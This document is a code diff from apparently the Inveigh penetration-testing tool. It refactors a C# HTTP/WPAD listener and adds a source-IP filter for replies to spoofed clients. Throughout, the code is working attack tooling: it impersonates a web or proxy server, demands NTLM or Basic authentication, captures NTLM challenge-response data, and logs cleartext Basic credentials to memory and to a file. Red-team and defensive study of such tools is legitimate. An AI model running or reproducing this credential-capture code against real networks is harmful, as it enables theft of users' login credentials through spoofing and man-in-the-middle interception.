@@ -20,7 +20,6 @@ namespace Inveigh
             TcpListener httpListener = null;
             TcpClient httpClient = new TcpClient();
             IAsyncResult httpAsync;
-            string httpType = "HTTP";
             IPAddress listenerIPAddress = IPAddress.Any;
 
             if (String.Equals(ipVersion, "IPv4") && !String.Equals(httpIP, "0.0.0.0"))
@@ -52,7 +51,7 @@ namespace Inveigh
 
                 lock (Program.outputList)
                 {
-                    Program.outputList.Add(String.Format("[!] Error starting unprivileged {1} listener, check IP and port usage.", DateTime.Now.ToString("s"), httpType));
+                    Program.outputList.Add(String.Format("[!] Error starting unprivileged {1} listener, check IP and port usage.", DateTime.Now.ToString("s"), method));
                 }
 
                 throw;
@@ -81,16 +80,15 @@ namespace Inveigh
 
         }
 
-        public static void GetHTTPClient(object Params)
+        public static void GetHTTPClient(object parameters)
         {
-            var args = Params;
-            object[] httpParams = Params as object[];
-            string method = Convert.ToString(httpParams[0]);
-            string httpIP = Convert.ToString(httpParams[1]);
-            string httpPort = Convert.ToString(httpParams[2]);
-            TcpClient httpClient = (TcpClient)httpParams[3];           
-            string httpRawURL = "";
-            string httpRawURLOld = "";
+            object[] parameterArray = parameters as object[];
+            string method = Convert.ToString(parameterArray[0]);
+            string httpIP = Convert.ToString(parameterArray[1]);
+            string httpPort = Convert.ToString(parameterArray[2]);
+            TcpClient httpClient = (TcpClient)parameterArray[3];           
+            string rawURL = "";
+            string rawURLOld = "";
             int httpReset = 0;
             NetworkStream httpStream = httpClient.GetStream();
 
@@ -101,7 +99,7 @@ namespace Inveigh
                 {
                     string contentLength = "Content-Length: 0";
                     string httpMethod = "";
-                    string httpRequest = "";
+                    string request = "";
                     string authorizationNTLM = "NTLM";
                     bool httpSend = true;
                     bool proxyIgnoreMatch = false;
@@ -115,77 +113,78 @@ namespace Inveigh
                     byte[] headerAuthenticateData = null;
                     byte[] headerCacheControl = null;
                     byte[] headerStatusCode = null;
-                    byte[] httpResponsePhrase = null;
-                    byte[] httpMessage = null;               
-                    byte[] httpRequestData = new byte[4096];
-                    bool httpClientClose = false;
-                    bool httpConnectionHeaderClose = false;
+                    byte[] headerLocation = null;
+                    byte[] responsePhrase = null;
+                    byte[] message = null;               
+                    byte[] requestData = new byte[4096];
+                    bool clientClose = false;
+                    bool connectionHeaderClose = false;
                     string httpNTLMStage = "";
                     httpReset++;
                     string[] httpMethods = { "GET", "HEAD", "OPTIONS", "CONNECT", "POST", "PROPFIND" };
 
                     while (httpStream.DataAvailable)
                     {
-                        httpStream.Read(httpRequestData, 0, httpRequestData.Length);
+                        httpStream.Read(requestData, 0, requestData.Length);
                     }
 
-                    httpRequest = BitConverter.ToString(httpRequestData);
+                    request = BitConverter.ToString(requestData);
 
-                    if (httpRequest.StartsWith("47-45-54-20"))
+                    if (request.StartsWith("47-45-54-20"))
                     {
                         httpMethod = "GET";
                     }
-                    else if (httpRequest.StartsWith("48-45-41-44-20"))
+                    else if (request.StartsWith("48-45-41-44-20"))
                     {
                         httpMethod = "HEAD";
                     }
-                    else if (httpRequest.StartsWith("4F-50-54-49-4F-4E-53-20"))
+                    else if (request.StartsWith("4F-50-54-49-4F-4E-53-20"))
                     {
                         httpMethod = "OPTIONS";
                     }
-                    else if (httpRequest.StartsWith("43-4F-4E-4E-45-43-54-20"))
+                    else if (request.StartsWith("43-4F-4E-4E-45-43-54-20"))
                     {
                         httpMethod = "CONNECT";
                     }
-                    else if (httpRequest.StartsWith("50-4F-53-54-20"))
+                    else if (request.StartsWith("50-4F-53-54-20"))
                     {
                         httpMethod = "POST";
                     }
-                    else if (httpRequest.StartsWith("50-52-4F-50-46-49-4E-44-20"))
+                    else if (request.StartsWith("50-52-4F-50-46-49-4E-44-20"))
                     {
                         httpMethod = "PROPFIND";
                     }
 
-                    if (!String.IsNullOrEmpty(httpRequest) && Array.Exists(httpMethods, element => element == httpMethod))
+                    if (!String.IsNullOrEmpty(request) && Array.Exists(httpMethods, element => element == httpMethod))
                     {
-                        httpRawURL = httpRequest.Substring(httpRequest.IndexOf("-20-") + 4, httpRequest.Substring(httpRequest.IndexOf("-20-") + 1).IndexOf("-20-") - 3);
-                        httpRawURL = Util.HexStringToString(httpRawURL);
-                        string httpSourceIP = ((IPEndPoint)(httpClient.Client.RemoteEndPoint)).Address.ToString();
-                        string httpSourcePort = ((IPEndPoint)(httpClient.Client.RemoteEndPoint)).Port.ToString();
-                        httpConnectionHeaderClose = true;
+                        rawURL = request.Substring(request.IndexOf("-20-") + 4, request.Substring(request.IndexOf("-20-") + 1).IndexOf("-20-") - 3);
+                        rawURL = Util.HexStringToString(rawURL);
+                        string sourceIP = ((IPEndPoint)(httpClient.Client.RemoteEndPoint)).Address.ToString();
+                        string sourcePort = ((IPEndPoint)(httpClient.Client.RemoteEndPoint)).Port.ToString();
+                        connectionHeaderClose = true;
 
-                        if (httpRequest.Contains("-48-6F-73-74-3A-20-")) // Host:
+                        if (request.Contains("-48-6F-73-74-3A-20-")) // Host:
                         {
-                            headerHost = httpRequest.Substring(httpRequest.IndexOf("-48-6F-73-74-3A-20-") + 19); // Host:
+                            headerHost = request.Substring(request.IndexOf("-48-6F-73-74-3A-20-") + 19); // Host:
                             headerHost = headerHost.Substring(0, headerHost.IndexOf("-0D-0A-"));
                             headerHost = Util.HexStringToString(headerHost);
                         }
 
-                        if (httpRequest.Contains("-55-73-65-72-2D-41-67-65-6E-74-3A-20-")) // User-Agent:
+                        if (request.Contains("-55-73-65-72-2D-41-67-65-6E-74-3A-20-")) // User-Agent:
                         {
-                            headerUserAgent = httpRequest.Substring(httpRequest.IndexOf("-55-73-65-72-2D-41-67-65-6E-74-3A-20-") + 37); // User-Agent:
+                            headerUserAgent = request.Substring(request.IndexOf("-55-73-65-72-2D-41-67-65-6E-74-3A-20-") + 37); // User-Agent:
                             headerUserAgent = headerUserAgent.Substring(0, headerUserAgent.IndexOf("-0D-0A-"));
                             headerUserAgent = Util.HexStringToString(headerUserAgent);
                         }
 
                         lock (Program.outputList)
                         {
-                            Program.outputList.Add(String.Format("[.] [{0}] {1}({2}) HTTP {3} request for {4} from {5}:{6}", DateTime.Now.ToString("s"), method, httpPort, httpMethod, httpRawURL, httpSourceIP, httpSourcePort));
-                            Program.outputList.Add(String.Format("[.] [{0}] {1}({2}) HTTP host header {3} from {4}:{5}", DateTime.Now.ToString("s"), method, httpPort, headerHost, httpSourceIP, httpSourcePort));
+                            Program.outputList.Add(String.Format("[.] [{0}] {1}({2}) HTTP {3} request for {4} from {5}:{6}", DateTime.Now.ToString("s"), method, httpPort, httpMethod, rawURL, sourceIP, sourcePort));
+                            Program.outputList.Add(String.Format("[.] [{0}] {1}({2}) HTTP host header {3} from {4}:{5}", DateTime.Now.ToString("s"), method, httpPort, headerHost, sourceIP, sourcePort));
 
                             if (!String.IsNullOrEmpty(headerUserAgent))
                             {
-                                Program.outputList.Add(String.Format("[.] [{0}] {1}({2}) HTTP user agent from {3}:{4}:{5}{6}", DateTime.Now.ToString("s"), method, httpPort, httpSourceIP, httpSourcePort, Environment.NewLine, headerUserAgent));
+                                Program.outputList.Add(String.Format("[.] [{0}] {1}({2}) HTTP user agent from {3}:{4}:{5}{6}", DateTime.Now.ToString("s"), method, httpPort, sourceIP, sourcePort, Environment.NewLine, headerUserAgent));
                             }
 
                         }
@@ -207,7 +206,7 @@ namespace Inveigh
                             {
                                 lock (Program.outputList)
                                 {
-                                    Program.outputList.Add(String.Format("[-] [{0}] {1}({2}) ignoring wpad.dat request for proxy due to user agent match from {3}:{4}", DateTime.Now.ToString("s"), method, httpPort, httpSourceIP, httpSourcePort));
+                                    Program.outputList.Add(String.Format("[-] [{0}] {1}({2}) ignoring wpad.dat request for proxy due to user agent match from {3}:{4}", DateTime.Now.ToString("s"), method, httpPort, sourceIP, sourcePort));
 
                                 }
 
@@ -215,14 +214,14 @@ namespace Inveigh
 
                         }
 
-                        if (httpRequest.Contains("-41-75-74-68-6F-72-69-7A-61-74-69-6F-6E-3A-20-")) // Authorization:
+                        if (request.Contains("-41-75-74-68-6F-72-69-7A-61-74-69-6F-6E-3A-20-")) // Authorization:
                         {
-                            headerAuthorization = httpRequest.Substring(httpRequest.IndexOf("-41-75-74-68-6F-72-69-7A-61-74-69-6F-6E-3A-20-") + 46); // Authorization:
+                            headerAuthorization = request.Substring(request.IndexOf("-41-75-74-68-6F-72-69-7A-61-74-69-6F-6E-3A-20-") + 46); // Authorization:
                             headerAuthorization = headerAuthorization.Substring(0, headerAuthorization.IndexOf("-0D-0A-"));
                             headerAuthorization = Util.HexStringToString(headerAuthorization);
                         }
 
-                        if (Program.argWPADAuthIgnore != null && Program.argWPADAuthIgnore.Length > 0 && Program.argWPADAuth.ToUpper().StartsWith("NTLM "))
+                        if (!Util.ArrayIsNullOrEmpty(Program.argWPADAuthIgnore) && Program.argWPADAuth.ToUpper().StartsWith("NTLM "))
                         {
 
                             foreach (string agent in Program.argWPADAuthIgnore)
@@ -240,23 +239,23 @@ namespace Inveigh
 
                                 lock (Program.outputList)
                                 {
-                                    Program.outputList.Add(String.Format("[-] [{0}] {1}({2}) switching wpad.dat auth to anonymous due to user agent match from {3}:{4}", DateTime.Now.ToString("s"), method, httpPort, httpSourceIP, httpSourcePort));
+                                    Program.outputList.Add(String.Format("[-] [{0}] {1}({2}) switching wpad.dat auth to anonymous due to user agent match from {3}:{4}", DateTime.Now.ToString("s"), method, httpPort, sourceIP, sourcePort));
                                 }
 
                             }
 
                         }
 
-                        if (!String.Equals(httpRawURL, "/wpad.dat") && String.Equals(Program.argHTTPAuth, "ANONYMOUS") || String.Equals(httpRawURL, "/wpad.dat") && String.Equals(Program.argWPADAuth, "ANONYMOUS") || wpadAuthIgnoreMatch)
+                        if (!String.Equals(rawURL, "/wpad.dat") && String.Equals(Program.argHTTPAuth, "ANONYMOUS") || String.Equals(rawURL, "/wpad.dat") && String.Equals(Program.argWPADAuth, "ANONYMOUS") || wpadAuthIgnoreMatch)
                         {
                             headerStatusCode = new byte[] { 0x32, 0x30, 0x30 }; // 200
-                            httpResponsePhrase = new byte[] { 0x4f, 0x4b }; // OK
-                            httpClientClose = true;
+                            responsePhrase = new byte[] { 0x4f, 0x4b }; // OK
+                            clientClose = true;
                         }
                         else
                         {
 
-                            if (String.Equals(httpRawURL, "/wpad.dat") && String.Equals(Program.argWPADAuth, "NTLM") || String.Equals(httpRawURL, "/wpad.dat") && String.Equals(Program.argHTTPAuth, "NTLM"))
+                            if (String.Equals(rawURL, "/wpad.dat") && String.Equals(Program.argWPADAuth, "NTLM") || String.Equals(rawURL, "/wpad.dat") && String.Equals(Program.argHTTPAuth, "NTLM"))
                             {
                                 ntlmESS = true;
                             }
@@ -272,7 +271,7 @@ namespace Inveigh
                                 headerAuthenticate = Encoding.UTF8.GetBytes("WWW-Authenticate: ");
                             }
 
-                            httpResponsePhrase = new byte[] { 0x55, 0x6e, 0x61, 0x75, 0x74, 0x68, 0x6f, 0x72, 0x69, 0x7a, 0x65, 0x64 }; //  Unauthorized
+                            responsePhrase = new byte[] { 0x55, 0x6e, 0x61, 0x75, 0x74, 0x68, 0x6f, 0x72, 0x69, 0x7a, 0x65, 0x64 }; //  Unauthorized
                         }
 
                         if (headerAuthorization.ToUpper().StartsWith("NTLM "))
@@ -280,18 +279,18 @@ namespace Inveigh
                             headerAuthorization = headerAuthorization.Substring(5, headerAuthorization.Length - 5);
                             byte[] httpAuthorization = Convert.FromBase64String(headerAuthorization);
                             httpNTLMStage = BitConverter.ToString(httpAuthorization.Skip(8).Take(4).ToArray());
-                            httpConnectionHeaderClose = false;
+                            connectionHeaderClose = false;
 
                             if ((BitConverter.ToString(httpAuthorization.Skip(8).Take(4).ToArray())).Equals("01-00-00-00"))
                             {
-                                authorizationNTLM = GetNTLMChallengeBase64(method, ntlmESS, httpSourceIP, httpSourcePort, httpPort);
+                                authorizationNTLM = GetNTLMChallengeBase64(method, ntlmESS, sourceIP, sourcePort, httpPort);
                             }
                             else if ((BitConverter.ToString(httpAuthorization.Skip(8).Take(4).ToArray())).Equals("03-00-00-00"))
                             {
-                                NTLM.GetNTLMResponse(httpAuthorization, httpSourceIP, httpSourcePort, method, httpPort, null);
+                                NTLM.GetNTLMResponse(httpAuthorization, sourceIP, sourcePort, method, httpPort, null);
                                 headerStatusCode = new byte[] { 0x32, 0x30, 0x30 }; // 200
-                                httpResponsePhrase = new byte[] { 0x4f, 0x4b }; // OK
-                                httpClientClose = true;
+                                responsePhrase = new byte[] { 0x4f, 0x4b }; // OK
+                                clientClose = true;
 
                                 if (String.Equals(method, "Proxy"))
                                 {
@@ -310,25 +309,25 @@ namespace Inveigh
                             }
                             else
                             {
-                                httpClientClose = true;
+                                clientClose = true;
                             }
 
                         }
                         else if (headerAuthorization.ToUpper().StartsWith("BASIC "))
                         {
                             headerStatusCode = new byte[] { 0x32, 0x30, 0x30 }; // 200
-                            httpResponsePhrase = new byte[] { 0x4f, 0x4b }; // OK
+                            responsePhrase = new byte[] { 0x4f, 0x4b }; // OK
                             string httpHeaderAuthorizationBase64 = headerAuthorization.Substring(6, headerAuthorization.Length - 6);
                             string cleartextCredentials = Encoding.UTF8.GetString(Convert.FromBase64String(httpHeaderAuthorizationBase64));
 
                             lock (Program.cleartextList)
                             {
-                                Program.cleartextList.Add(String.Concat(httpSourceIP, " ", cleartextCredentials));
+                                Program.cleartextList.Add(String.Concat(sourceIP, " ", cleartextCredentials));
                             }
 
                             lock (Program.outputList)
                             {
-                                Program.outputList.Add(String.Format("[+] [{0}] {1}({2}) Basic authentication cleartext credentials captured from {3}({4}):", DateTime.Now.ToString("s"), method, httpPort, httpSourceIP, httpSourcePort));
+                                Program.outputList.Add(String.Format("[+] [{0}] {1}({2}) Basic authentication cleartext credentials captured from {3}({4}):", DateTime.Now.ToString("s"), method, httpPort, sourceIP, sourcePort));
                                 Program.outputList.Add(cleartextCredentials);
                             }
 
@@ -337,7 +336,7 @@ namespace Inveigh
 
                                 lock (Program.cleartextFileList)
                                 {
-                                    Program.cleartextFileList.Add(String.Concat(httpSourceIP, " ", cleartextCredentials));
+                                    Program.cleartextFileList.Add(String.Concat(sourceIP, " ", cleartextCredentials));
                                 }
 
                                 Program.outputList.Add(String.Format("[+] [{0}] {1}({2}) Basic authentication cleartext credentials written to {3}", DateTime.Now.ToString("s"), method, httpPort, String.Concat(Program.argFilePrefix, "-Cleartext.txt")));
@@ -345,99 +344,108 @@ namespace Inveigh
 
                         }
 
-                        if (!String.IsNullOrEmpty(Program.argWPADResponse) && !proxyIgnoreMatch && String.Equals(httpRawURL, "/wpad.dat") && httpClientClose)
+                        if (!String.IsNullOrEmpty(Program.argWPADResponse) && !proxyIgnoreMatch && String.Equals(rawURL, "/wpad.dat") && clientClose)
                         {
                             headerContentType = Encoding.UTF8.GetBytes("Content-Type: application/x-ns-proxy-autoconfig");
-                            httpMessage = Encoding.UTF8.GetBytes(Program.argWPADResponse);
+                            message = Encoding.UTF8.GetBytes(Program.argWPADResponse);
                         }
                         else if (!String.IsNullOrEmpty(Program.argHTTPResponse))
                         {
-                            httpMessage = Encoding.UTF8.GetBytes(Program.argHTTPResponse);
+                            message = Encoding.UTF8.GetBytes(Program.argHTTPResponse);
                         }
 
                         DateTime currentTime = DateTime.Now;
                         byte[] httpTimestamp = Encoding.UTF8.GetBytes(currentTime.ToString("R"));
 
-                        if ((Program.argHTTPAuth.StartsWith("NTLM") && !String.Equals(httpRawURL, "/wpad.dat")) || (Program.argWPADAuth.StartsWith("NTLM") && String.Equals(httpRawURL, "/wpad.dat")))
+                        if ((Program.argHTTPAuth.StartsWith("NTLM") && !String.Equals(rawURL, "/wpad.dat")) || (Program.argWPADAuth.StartsWith("NTLM") && String.Equals(rawURL, "/wpad.dat")))
                         {
                             headerAuthenticateData = Encoding.UTF8.GetBytes(authorizationNTLM);
                         }
-                        else if ((String.Equals(Program.argHTTPAuth, "BASIC") && !String.Equals(httpRawURL, "/wpad.dat")) || String.Equals(Program.argWPADAuth, "BASIC") && String.Equals(httpRawURL, "/wpad.dat"))
+                        else if ((String.Equals(Program.argHTTPAuth, "BASIC") && !String.Equals(rawURL, "/wpad.dat")) || String.Equals(Program.argWPADAuth, "BASIC") && String.Equals(rawURL, "/wpad.dat"))
                         {
                             headerAuthenticateData = Encoding.UTF8.GetBytes(String.Concat("Basic realm=", Program.argHTTPBasicRealm));
                         }
 
-                        using (MemoryStream httpMemoryStream = new MemoryStream())
+                        using (MemoryStream memoryStream = new MemoryStream())
                         {
-                            httpMemoryStream.Write((new byte[9] { 0x48, 0x54, 0x54, 0x50, 0x2f, 0x31, 0x2e, 0x31, 0x20 }), 0, 9); // HTTP/1.1
-                            httpMemoryStream.Write(headerStatusCode, 0, headerStatusCode.Length);
-                            httpMemoryStream.Write((new byte[1] { 0x20 }), 0, 1);
-                            httpMemoryStream.Write(httpResponsePhrase, 0, httpResponsePhrase.Length);
-                            httpMemoryStream.Write((new byte[2] { 0x0d, 0x0a }), 0, 2);
+                            memoryStream.Write((new byte[9] { 0x48, 0x54, 0x54, 0x50, 0x2f, 0x31, 0x2e, 0x31, 0x20 }), 0, 9); // HTTP/1.1
+                            memoryStream.Write(headerStatusCode, 0, headerStatusCode.Length);
+                            memoryStream.Write((new byte[1] { 0x20 }), 0, 1);
+                            memoryStream.Write(responsePhrase, 0, responsePhrase.Length);
+                            memoryStream.Write((new byte[2] { 0x0d, 0x0a }), 0, 2);
 
-                            if (httpConnectionHeaderClose)
+                            if (connectionHeaderClose)
                             {
                                 byte[] httpHeaderConnection = Encoding.UTF8.GetBytes("Connection: close");
-                                httpMemoryStream.Write(httpHeaderConnection, 0, httpHeaderConnection.Length);
-                                httpMemoryStream.Write((new byte[2] { 0x0d, 0x0a }), 0, 2);
+                                memoryStream.Write(httpHeaderConnection, 0, httpHeaderConnection.Length);
+                                memoryStream.Write((new byte[2] { 0x0d, 0x0a }), 0, 2);
                             }
 
-                            byte[] httpHeaderServer = Encoding.UTF8.GetBytes("Server: Microsoft-HTTPAPI/2.0");
-                            httpMemoryStream.Write(httpHeaderServer, 0, httpHeaderServer.Length);
-                            httpMemoryStream.Write((new byte[2] { 0x0d, 0x0a }), 0, 2);
-                            httpMemoryStream.Write((new byte[6] { 0x44, 0x61, 0x74, 0x65, 0x3a, 0x20 }), 0, 6); // Date: 
-                            httpMemoryStream.Write(httpTimestamp, 0, httpTimestamp.Length);
-                            httpMemoryStream.Write((new byte[2] { 0x0d, 0x0a }), 0, 2);
+                            byte[] headerServer = Encoding.UTF8.GetBytes("Server: Microsoft-HTTPAPI/2.0");
+                            memoryStream.Write(headerServer, 0, headerServer.Length);
+                            memoryStream.Write((new byte[2] { 0x0d, 0x0a }), 0, 2);
+                            memoryStream.Write((new byte[6] { 0x44, 0x61, 0x74, 0x65, 0x3a, 0x20 }), 0, 6); // Date: 
+                            memoryStream.Write(httpTimestamp, 0, httpTimestamp.Length);
+                            memoryStream.Write((new byte[2] { 0x0d, 0x0a }), 0, 2);
 
-                            if (headerAuthenticate != null && headerAuthenticate.Length > 0 && headerAuthenticateData != null && headerAuthenticateData.Length > 0)
+                            if (!Util.ArrayIsNullOrEmpty(headerAuthenticate) && !Util.ArrayIsNullOrEmpty(headerAuthenticateData))
                             {
-                                httpMemoryStream.Write(headerAuthenticate, 0, headerAuthenticate.Length);
-                                httpMemoryStream.Write(headerAuthenticateData, 0, headerAuthenticateData.Length);
-                                httpMemoryStream.Write((new byte[2] { 0x0d, 0x0a }), 0, 2);
+                                memoryStream.Write(headerAuthenticate, 0, headerAuthenticate.Length);
+                                memoryStream.Write(headerAuthenticateData, 0, headerAuthenticateData.Length);
+                                memoryStream.Write((new byte[2] { 0x0d, 0x0a }), 0, 2);
                             }
 
-                            if (headerContentType != null && headerContentType.Length > 0)
+                            if (!Util.ArrayIsNullOrEmpty(headerContentType))
                             {
-                                httpMemoryStream.Write(headerContentType, 0, headerContentType.Length);
-                                httpMemoryStream.Write((new byte[2] { 0x0d, 0x0a }), 0, 2);
+                                memoryStream.Write(headerContentType, 0, headerContentType.Length);
+                                memoryStream.Write((new byte[2] { 0x0d, 0x0a }), 0, 2);
                             }
 
-                            if (headerCacheControl != null && headerCacheControl.Length > 0)
+                            if (!Util.ArrayIsNullOrEmpty(headerCacheControl))
                             {
-                                httpMemoryStream.Write(headerCacheControl, 0, headerCacheControl.Length);
-                                httpMemoryStream.Write((new byte[2] { 0x0d, 0x0a }), 0, 2);
+                                memoryStream.Write(headerCacheControl, 0, headerCacheControl.Length);
+                                memoryStream.Write((new byte[2] { 0x0d, 0x0a }), 0, 2);
                             }
 
-                            if (httpMessage != null && httpMessage.Length > 0)
+                            if (!Util.ArrayIsNullOrEmpty(message))
                             {
-                                contentLength = "Content-Length: " + httpMessage.Length;
+                                contentLength = "Content-Length: " + message.Length;
                             }
                             else
                             {
                                 contentLength = "Content-Length: 0";
                             }
 
-                            byte[] httpHeaderContentLength = Encoding.UTF8.GetBytes(contentLength);
-                            httpMemoryStream.Write(httpHeaderContentLength, 0, httpHeaderContentLength.Length);
-                            httpMemoryStream.Write((new byte[2] { 0x0d, 0x0a }), 0, 2);
-                            httpMemoryStream.Write((new byte[2] { 0x0d, 0x0a }), 0, 2);
+                            byte[] headerContentLength = Encoding.UTF8.GetBytes(contentLength);
+                            memoryStream.Write(headerContentLength, 0, headerContentLength.Length);
+                            memoryStream.Write((new byte[2] { 0x0d, 0x0a }), 0, 2);
+                            memoryStream.Write((new byte[2] { 0x0d, 0x0a }), 0, 2);
 
-                            if (httpMessage != null && httpMessage.Length > 0)
+                            if (!Util.ArrayIsNullOrEmpty(message))
                             {
-                                httpMemoryStream.Write(httpMessage, 0, httpMessage.Length);
+                                memoryStream.Write(message, 0, message.Length);
                             }
-          
-                            if(httpSend && httpStream.CanRead)
+
+                            if ((!Util.ArrayIsNullOrEmpty(Program.argSpooferIPsIgnore) && Array.Exists(Program.argSpooferIPsIgnore, element => element == sourceIP)) || (!Util.ArrayIsNullOrEmpty(Program.argSpooferIPsReply) && !Array.Exists(Program.argSpooferIPsReply, element => element == sourceIP)))
                             {
-                                httpStream.Write(httpMemoryStream.ToArray(), 0, httpMemoryStream.ToArray().Length);
+
+                                lock (Program.outputList)
+                                {
+                                    Program.outputList.Add(String.Format("[-] [{0}] {1}({2}) HTTP {3} request for {4} ignored from {5}:{6}", DateTime.Now.ToString("s"), method, httpPort, httpMethod, rawURL, sourceIP, sourcePort));
+                                }            
+
+                            }
+                            else
+                            {
+                                httpStream.Write(memoryStream.ToArray(), 0, memoryStream.ToArray().Length);
                                 httpStream.Flush();
                             }
 
                         }
 
-                        httpRawURLOld = httpRawURL;
+                        rawURLOld = rawURL;
 
-                        if (httpClientClose)
+                        if (clientClose)
                         {
 
                             if (String.Equals(method, "Proxy"))
@@ -455,7 +463,7 @@ namespace Inveigh
                     else
                     {
 
-                        if(httpConnectionHeaderClose || httpReset > 20)
+                        if(connectionHeaderClose || httpReset > 20)
                         {
                             httpClient.Close();
                         }
